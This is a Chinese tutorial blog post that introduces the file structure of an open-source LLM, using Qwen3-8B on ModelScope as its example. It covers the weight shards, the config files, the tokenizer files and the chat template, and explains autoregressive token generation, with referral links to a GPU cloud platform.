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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>上篇文章 <a href="https://juejin.cn/post/7594655863548297268" target="_blank" title="https://juejin.cn/post/7594655863548297268">大模型训练全流程实战指南（一）——为什么要学习大模型训练？</a>分享了学习大模型训练对职业发展与科研探索的重要意义。本期笔者将正式进入实战基础环节，系统性地拆解大模型训练的核心内容。掌握大模型训练，首先必须理解其底层原理与基本构成。然而，目前很多资料仅停留在工具使用层面，缺少深入剖析模型的工作原理。为此本文将从开源大模型的<strong>文件结构</strong>入手，带大家逐步认识大模型的组成部分，并通过代码解读模型如何理解人类语言、生成对话背后的核心机制。</p>
<p>大模型训练对计算资源有一定要求，尤其是GPU显存。为降低学习门槛，笔者与国内主流云平台合作，大家可以通过打开链接: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lab4ai.cn%2Fregister%3FagentID%3Duser-XorgKKc56U" target="_blank" title="https://www.lab4ai.cn/register?agentID=user-XorgKKc56U" ref="nofollow noopener noreferrer">www.lab4ai.cn/register?ag…</a> ，体验<strong>H100 GPU 6.5小时</strong>的算力。本系列所有实战教程均将在该平台上完成，帮助大家低成本上手实践。</p>
<p>除大模型训练外，笔者也在同步更新<a href="https://juejin.cn/column/7526240014499495972" target="_blank" title="https://juejin.cn/column/7526240014499495972">《深入浅出LangChain&amp;LangGraph AI Agent 智能体开发》</a>免费专栏，要说明该专栏适合所有对 LangChain 感兴趣的学习者，无论之前是否接触过 LangChain。该专栏基于笔者在实际项目中的深度使用经验，系统讲解了使用LangChain/LangGraph如何开发智能体，目前已更新 36 讲，并持续补充实战与拓展内容。欢迎感兴趣的同学关注笔者的掘金账号与专栏，也可关注笔者的同名微信公众号<strong>大模型真好玩</strong>，每期分享涉及的代码均可在公众号私信: <strong>LangChain智能体开发</strong>免费获取。</p>
<h2 data-id="heading-1">一、大模型研究常用网站</h2>
<p>当前，各类大模型层出不穷。开源大模型更是我国大模型发展的关键路径之一。然而，面对众多开源模型，大家是否曾深入思考：模型“开源”究竟意味着什么？一个完整的大模型，到底包含哪些组成部分？今天的分享中，笔者将避开抽象的概念讲解，直接打开一个真实的开源模型仓库，从最实际的角度出发，了解如何获取大模型的原始文件。</p>
<p>如同大家日常代码开发通常依托于 GitHub 或 GitCode 等平台，大模型的发布也依赖于类似的托管社区。目前，全球最大、最活跃的大模型社区是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2F" target="_blank" title="https://huggingface.co/" ref="nofollow noopener noreferrer">Hugging Face</a>，可以将其理解为“AI 领域的 GitHub”。它托管了数以万计的模型、数据集与应用，是全球开发者首选平台。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77d93b54aaaa4e17ab9aed4b4022e9b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=ohG%2B0ULRRPyA9Ktr31I8ngeuZn4%3D" alt="0.png" loading="lazy"/></p>
<p>不过，由于网络访问限制，国内用户有时访问 Hugging Face 并不顺畅，这与访问 GitHub 的情况类似。好在国内的大模型生态同样繁荣，正如我们有 GitCode 作为 GitHub 的替代，我们也有 Hugging Face 的国内优秀替代——<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.modelscope.cn%2F" target="_blank" title="https://www.modelscope.cn/" ref="nofollow noopener noreferrer">魔搭（ModelScope）</a>。</p>
<p>ModelScope 社区由阿里巴巴达摩院与 CCF 开源发展技术委员会在 2022 年 11 月共同发起创立，是一个面向全球的模型开源社区与创新平台。与 Hugging Face 类似，ModelScope 也托管了大量高质量的开源模型与数据集，在国际上也具有一定影响力，完全能够满足我们的学习与研究需求。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8914157528e84a0f931c42d54592e073~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=4ddryKBrdhY%2F1OOCSiMxbg%2BTkM8%3D" alt="1.png" loading="lazy"/></p>
<p>考虑到访问便捷性与学习成本，<strong>本系列教程中使用的所有模型与数据集，都将从 ModelScope 上获取</strong>，确保大家都能顺畅地跟随实践。接下来，我们就正式进入模型仓库，一探究竟。</p>
<h2 data-id="heading-2">二、大模型文件组成总览</h2>
<p>接下来笔者就与大家共同拆解一个开源大模型，了解开源大模型的文件组成与功能。笔者这里以广受好评的国产模型——<a href="https://juejin.cn/post/7498964911529361408" target="_blank" title="https://juejin.cn/post/7498964911529361408">Qwen3系列</a>为例进行说明。本次选取的具体模型是Qwen3-8B，该系列的其他模型（如1.5B、32B等）文件结构与此完全一致，仅参数量不同。</p>
<p>首先访问ModelScope网站，搜索“Qwen3-8B”并进入其官方模型页。在页面上可以浏览到模型的特性介绍、技术报告以及各项性能基准测试结果。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4bbb576c6734001a3e792ecefea63a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=Y48s7G3eEqlGPCLjXr15VqNG35E%3D" alt="2.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/349c7ae7b93641d0a11a1dca63917ea8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=FLgNT6glSverKj7TeM81F7fGuNo%3D" alt="3.png" loading="lazy"/></p>
<p>模型的<strong>核心文件</strong>位于“文件列表”（Files）选项卡中。一个典型且完整的大模型发布通常包含以下几类关键文件：</p>
<ul>
<li><strong>模型权重文件</strong>：存储神经网络的参数，是模型的知识核心。常见格式为 <code>model-*.safetensors</code> 分片文件，并由 <code>model.safetensors.index.json</code> 索引文件说明分片信息。</li>
<li><strong>模型配置文件</strong>：定义模型的结构与超参数，如层数、注意力头数、隐藏维度等。主要文件为 <code>config.json</code> 或 <code>configuration.json</code>。</li>
<li><strong>生成配置文件</strong>：预设文本生成的策略参数，如 <code>temperature</code>、<code>top_p</code> 等。文件通常为 <code>generation_config.json</code>。</li>
<li><strong>分词器文件</strong>：包含词汇表与分词规则，负责将文本转换为模型可理解的 token ID。典型文件包括 <code>tokenizer.json</code>、<code>tokenizer_config.json</code> 和 <code>vocab.json</code> 等。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4bb963cbfeb499db97ffa9f71dc4cf5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=QnFsLNjil83n3Dm7FKySBH9v2kw%3D" alt="4.png" loading="lazy"/></p>
<p>对于Qwen3及许多开源模型，社区通常仅发布上述<strong>模型权重与配置文件</strong>。而一些更开放的模型发布（如“大模型之光”<strong>DeepSeek-V3.1</strong>），则会在基础上进一步提供<strong>模型实现源码</strong>。例如，在DeepSeek-V3.1的文件目录中可以看到关键的 <code>modeling_deepseek.py</code> 文件，它完整定义了模型的计算图与前向传播逻辑。大家可以参考该python文件复现DeepSeek模型源码。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a0b058343bf544e09b61b91be60fddd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=xhffze%2FORLlLwe9rBKGLykqtWUY%3D" alt="5.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c041eb3abbaf4c9fb92208cbeadcc699~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=9xZUTDjtIRIfVFTOCb7rY0vq4RE%3D" alt="6.png" loading="lazy"/></p>
<p>读到这里有的同学可能会说，“我现在知道了这些文件的名字和分类，但它们具体是如何协作，让模型‘工作’起来的呢？”，的确，仅仅认识文件列表，还不足以理解大模型是如何思考与对话的。要真正弄明白每个文件的作用，需要深入模型运行的基本原理。接下来笔者就用最直观的方式，揭开大模型工作的神秘面纱。</p>
<h2 data-id="heading-3">三、大模型文件解读与原理剖析</h2>
<h3 data-id="heading-4">3.1 大模型是如何组成的？</h3>
<p>大模型本质上是一个由海量神经元构成的深度神经网络。如下图示意，每个圆圈代表一个神经元，连接线则代表可学习的权重参数。大家可以这样理解神经元的计算过程：假设网络输入是一个向量数组（例如下图中起始的2个神经元，数值可能是 <strong>[1, 2]</strong> ），而每个神经元会接收来自上一层的所有输入，并乘以各自的权重，再加上一个偏置（即完成 <strong>w*x + b</strong> 运算），最终产生下一层的激活值。例如，若输入为 <strong>[1, 2]</strong>，图中中间层第一个神经元的值可能为 <strong>3×1 + 5×2 + 6（偏置）= 19</strong>，第二个为 <strong>12×1 + 4×2 + 3 = 23</strong>，依此类推，直至得到最终的输出。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/577104e7162a425494aa03e81bc40dd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=r1Ew8ciBZOIgMgrPHgKkVt7yBKg%3D" alt="7.png" loading="lazy"/></p>
<p>当然，真实的模型结构远比示意图复杂。神经元的排列方式（即模型架构）多种多样，层数、每层的单元数都可以变化。下图就展示了一个比上图多一层的网络结构。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3075bd0167464682974a65d6b18b2942~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=NFqKE6NjbBUxMhGp8SIe%2BgMgG%2B4%3D" alt="8.png" loading="lazy"/></p>
<p>因此，一个训练好的模型可以大致拆分为两部分：<strong>模型结构定义</strong>与<strong>模型权重参数</strong>。</p>
<h4 data-id="heading-5">3.1.1 模型结构</h4>
<p>关于模型结构首先看<code>model.json</code>文件，这个文件主要描述了模型的结构，用了什么框架，网络的维度和层数分别是多少等。简单介绍几个其中的参数:</p>
<ul>
<li><strong>architectures：</strong> 介绍了模型的类名</li>
<li><strong>vocab_size:</strong> 可以理解为词语数，Qwen3-8B理解世界上151936个词</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35420c20bb044972a7cb6e035cbe407e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=oeiHxbmq9t%2BCqmYr21hIwvK85Ec%3D" alt="11.png" loading="lazy"/></p>
<p><code>configuration.json</code>则定义了是使用什么框架编写的模型，主要任务是什么，Qwen3-8B是pytorch框架编写的，主要的任务是文本生成。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb01710d82b54d74ad8ce10acbb214f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=n01oGXTF6g4be2lpj942xzRqcAU%3D" alt="13.png" loading="lazy"/></p>
<h4 data-id="heading-6">3.1.2 权重组成</h4>
<p>除模型结构文件外，大家还可以看到的大量 <code>.safetensors</code> 文件，正是模型的<strong>权重文件</strong>，它们保存了模型结构中所有连接上的参数数值。Qwen3-8B 表示其拥有约 80 亿（8B，1B=10亿）个参数，数据量巨大，因此通常会被分割成多个 <code>.safetensors</code> 分片文件，便于存储与并行加载。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/083c06f6f194421195decf2e94fd47d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=dz%2BEyZ%2Bju2waA3r%2F8wFc%2BFnq%2BBo%3D" alt="9.png" loading="lazy"/></p>
<p>有了权重文件，程序还需要知道每个权重对应模型结构中的哪一部分。这个映射关系由 <code>model.safetensors.index.json</code> 文件记录。它是一个<strong>索引文件</strong>，详细说明了模型每一层的参数存储在哪个具体的 <code>.safetensors</code> 分片文件中。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0121ad3ecb4548db9c1dabadbc792ba1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=oVANDbfFZdEKhw1bkDiyKSfz738%3D" alt="10.png" loading="lazy"/></p>
<h3 data-id="heading-7">3.2 大模型是如何产生回答的？</h3>
<h4 data-id="heading-8">3.2.1 大模型生成文本原理</h4>
<p>大家是否好奇过，大模型是如何理解你的问题并生成回答的？像 Qwen、DeepSeek 这样的大语言模型，本质上是<strong>自回归生成模型</strong>。它并不直接“理解”语义，而是基于统计规律预测下一个最可能出现的词（Token）。</p>
<p>整个过程开始于<strong>分词</strong>。当输入“你好大模型，我的名字叫苍老师”时，模型首先会使用<strong>分词器</strong>将这句话切分成一个个 词（也就是常说的<strong>Token</strong>），例如：“你好”、“大模型”、“，”、“我”、“的”、“名字”、“叫”、“苍老师”。</p>
<p>为什么要分词？这模仿了人类理解语言的过程——我们也是通过词语来构建语义信息并生成回答的。模型接收到 Token 序列后，会基于前面的所有 Token 来预测下一个 Token 是什么。例如：</p>
<ol>
<li>输入：“你好”、“大模型”、“，”、“我”、“的”、“名字”、“叫”、“苍老师”</li>
<li>模型预测下一个 Token 可能是“你好呀”，并将其加入序列。</li>
<li>新的输入序列变为：“你好”、“大模型”、“，”、“我”、“的”、“名字”、“叫”、“苍老师”、“你好呀”</li>
<li>模型根据新序列继续预测下一个 Token，可能是“我的”。</li>
<li>如此循环迭代，最终可能生成完整的回复：“你好呀，我的名字是Qwen3”。</li>
</ol>
<p>这个过程可以直观地理解为下图所示的“接龙”游戏：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cfb9951f92648deb3be8a0954dcb549~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=UOTQdjo72lqWIAabtkLGZm56YtU%3D" alt="14.png" loading="lazy"/></p>
<p>因此，大模型处理输入的第一步，就是通过分词器将文本转化为 Token 序列，这依赖于分词器相关的文件。笔者前面也说过，大模型接收的其实是数字参数（它是不能直接理解词的意思的），那么如何将分词后的字词列表转化为大模型可以理解的数字呢？</p>
<p>文件列表中<code>tokenizer.json</code> 文件包含了详细的分词规则和词表。大家可以下载该文件，在其中搜索“Hello”，会发现它对应的 Token ID 是 9707。大模型正是依赖这个分词器文件将语句进行分词，然后并将词列表转化为词的id数字列表。（最后数字列表经过大模型会转化为输入神经元的词向量）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba77a2b7b34b43888b55827e543003d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=dvwuuIenY8OGflEmFOjJIGm0r%2BE%3D" alt="15.png" loading="lazy"/></p>
<p>除了 <code>tokenizer.json</code>，还有一个 <code>tokenizer_config.json</code> 文件。它定义了编码方式、特殊符号以及对话模板等重要信息。这里又有一个问题啦，特殊符号和对话模板是什么？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab485f4074e04c84b5fec3e6f1d2b062~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=bK45MXuX7h67vFdGx7bnl5RKo0I%3D" alt="16.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd7e88a77f7d483e9950a99fe00f1bd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=eU3NNDG7ccEdPLzXjvm2K1pF9Cc%3D" alt="17.png" loading="lazy"/></p>
<p>观察上面大模型预测的示意图，大家会发现一个关键问题：模型的输入序列中，如何区分哪些是用户的提问，哪些是模型自己的回复？这时就需要<strong>特殊符号</strong>和<strong>对话模板</strong>了。</p>
<p>用户的原始输入不会直接交给模型，而是先要按照 <code>chat_template</code> 中定义的格式进行组装。不同模型的模板不同，模型只有在符合自身模板的输入格式下，才能正确工作。例如，当你输入“你好”时，经过 Qwen3 的模板转换，实际送入模型的文本会变成：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-operator">&lt;</span><span class="hljs-operator">|</span>im_start<span class="hljs-operator">|</span><span class="hljs-operator">&gt;</span><span class="hljs-keyword">user</span>
你好<span class="hljs-operator">&lt;</span><span class="hljs-operator">|</span>im_end<span class="hljs-operator">|</span><span class="hljs-operator">&gt;</span>
<span class="hljs-operator">&lt;</span><span class="hljs-operator">|</span>im_start<span class="hljs-operator">|</span><span class="hljs-operator">&gt;</span>assistant
</code></pre>
<p>这里：</p>
<ul>
<li><code>&lt;|im_start|&gt;</code> 标记一段话的开始。</li>
<li><code>user</code> 或 <code>assistant</code> 表明说话者的角色。</li>
<li><code>&lt;|im_end|&gt;</code> 标记一段话的结束。</li>
</ul>
<p>这样，模型就能清晰地识别出对话的上下文结构。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd093971f5244c84b56a3c60f0b8cbf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=G2B8vj1UchlgbJXKD3N%2FiY4SkMk%3D" alt="18.png" loading="lazy"/></p>
<p>此外，Qwen3-8B 还包含一个 <strong><code>vocab.json</code></strong> 文件，它直接存储了词表中每个 Token 与其对应 ID 的映射关系。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a06e22ccfd446dc9e415b364775b3cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768972624&amp;x-signature=dXKfnCCDqRyIx5528GQMzdh2cog%3D" alt="19.png" loading="lazy"/></p>
<p>总而言之，<strong>分词器</strong>的核心工作有两步：</p>
<ol>
<li><strong>编码</strong>：将人类可读的文本，通过分词规则和词表，转换成模型可处理的 Token ID 序列。</li>
<li><strong>解码</strong>：将模型生成的 Token ID 序列，反向转换回人类可读的文本。</li>
</ol>
<h4 data-id="heading-9">3.2.2 大模型推理实战指南</h4>
<p>“纸上得来终觉浅，绝知此事要躬行。”理解了原理，下一步笔者带大家动手实践，验证大模型的工作流程是否如我们所讲。</p>
<p>大模型推理需要一定的计算资源，不过请放心，笔者已为大家争取了福利。大家可以通过打开链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lab4ai.cn%2Fregister%3FagentID%3Duser-XorgKKc56U" target="_blank" title="https://www.lab4ai.cn/register?agentID=user-XorgKKc56U" ref="nofollow noopener noreferrer">www.lab4ai.cn/register?ag…</a>，领取 <strong>50元无门槛代金券</strong>，免费体验 <strong>H100 GPU 6.5小时</strong> 的算力。本系列所有实战教程均可在该平台上完成。</p>
<p>下面笔者就将之前介绍的所有文件和作用串联起来，通过代码看看实际运行时发生了什么。</p>
